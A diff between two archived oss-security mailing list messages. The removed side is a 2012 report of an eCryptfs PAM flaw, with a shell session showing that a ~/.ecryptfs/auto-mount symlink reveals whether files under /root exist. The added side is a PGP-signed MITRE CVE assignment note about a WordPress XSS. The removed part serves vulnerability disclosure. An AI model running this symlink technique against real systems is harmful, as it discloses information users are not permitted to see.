@@ -1,53 +1,34 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/07/14/2
-Message-ID: <CAHmME9pReF5h+nnAG5qn9CKeGQtJcg4EzgtQT7hns1A1QDLjeg@mail.gmail.com>
-Date: Sat, 14 Jul 2012 09:18:27 +0200
-From: "Jason A. Donenfeld" <Jason@...c4.com>
-To: oss-security@...ts.openwall.com
-Cc: Tyler Hicks <tyhicks@...onical.com>, Kurt Seifried <kseifried@...hat.com>,  Marcus Meissner <meissner@...e.de>, Dan Rosenberg <dan.j.rosenberg@...il.com>
-Subject: Re: Re: ecryptfs headsup
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/01/04/2
+Message-Id: <201201040257.q042vdTv025674@linus.mitre.org>
+Date: Tue, 3 Jan 2012 21:57:39 -0500 (EST)
+From: cve-assign@...re.org
+To: kseifrie@...hat.com, oss-security@...ts.openwall.com
+Cc: cve-assign@...re.org
+Subject: Re: CVE request: XSS in wordpress 3.3
 Content-Type: text/plain; charset=utf-8
 
-Looks like another issue with that pam module. I can determine whether
-or not any file exists as an unprivileged user:
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-We make sure that we have an existing root file and a non-existing root file:
-zx2c4@...g ~ $ sudo touch /root/this-file-exists
-zx2c4@...g ~ $ sudo rm -f /root/this-file-does-not-exist
+The researcher sent e-mail to MITRE earlier today with a
+pre-disclosure reservation request for this issue. We sent him
+CVE-2012-0287 about eight hours ago. So, CVE-2012-0026 will be
+rejected.
 
-We double check that zx2c4 can't know about them:
-zx2c4@...g ~ $ stat /root/this-file-exists
-stat: cannot stat `/root/this-file-exists': Permission denied
-zx2c4@...g ~ $ stat /root/this-file-does-not-exist
-stat: cannot stat `/root/this-file-does-not-exist': Permission denied
-zx2c4@...g ~ $ ls /root
-ls: cannot open directory /root: Permission denied
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S S145
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/obtain_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.11 (SunOS)
 
-We replace .ecryptfs/auto-mount with a symlink to a root file that
-does not exist:
-zx2c4@...g ~ $ rm -f .ecryptfs/auto-mount
-zx2c4@...g ~ $ ln -s /root/this-file-does-not-exist .ecryptfs/auto-mount
-
-
-And we see that our private directory doesn't get mounted:
-zx2c4@...g ~ $ sudo login zx2c4
-Password:
-Last login: Sat Jul 14 03:07:33 EDT 2012 on pts/5
-zx2c4@...g ~ $ mount|grep ecrypt
-
-zx2c4@...g ~ $ exit
-
-We next replace .ecryptfs/auto-mount with a symlink to a root file
-that *does* exist:
-zx2c4@...g ~ $ rm -f .ecryptfs/auto-mount
-zx2c4@...g ~ $ ln -s /root/this-file-exists .ecryptfs/auto-mount
-
-And we see that it does in fact get mounted:
-zx2c4@...g ~ $ sudo login zx2c4
-Password:
-Last login: Sat Jul 14 03:09:10 EDT 2012 on pts/5
-zx2c4@...g ~ $ mount|grep ecrypt
-/home/zx2c4/.Private on /home/zx2c4/Private type ecryptfs
-(ecryptfs_check_dev_ruid,ecryptfs_sig=e38bb31e419c9f03,ecryptfs_fnek_sig=5e2b499985de965d,ecryptfs_cipher=aes,ecryptfs_key_bytes=16,ecryptfs_unlink_sigs)
-
-File existence disclosure.
+iQEcBAEBAgAGBQJPA774AAoJEGvefgSNfHMd0pQH/2VihAjApqiXAR5DjH3qb7oq
+mcp5UMO4h9h3rgCnIFOkRIQZoMyOMg7cs+ze5m76wdVGj1NhW4/sYsUqSBI0TdIx
+aVUMxY2tAQ+QmMPZgdxLIoJwJ4q4VVgUgnIp0G+dxMO6rIT4Cb7/+Tk7gqMmdhqU
+TLzVtpWGm6CmiCIcR/nqGpc+3oS/VYpCh9JzTjieoAtO0hdvHXBzL8jHXlNwL7kw
+BTwEFCOGJwNxYAq9trzFZbirf4Y7nHNfOAwI+JLGmHY+D8xDtyOJSAC5OFkUy/s+
+RlwCd6ukfZzHuGBtEJ2AQ/WUG+fK+HakbB/6wJZmTEGsR2I/yMiFPs1iSb0PqYs=
+=hZnp
+-----END PGP SIGNATURE-----
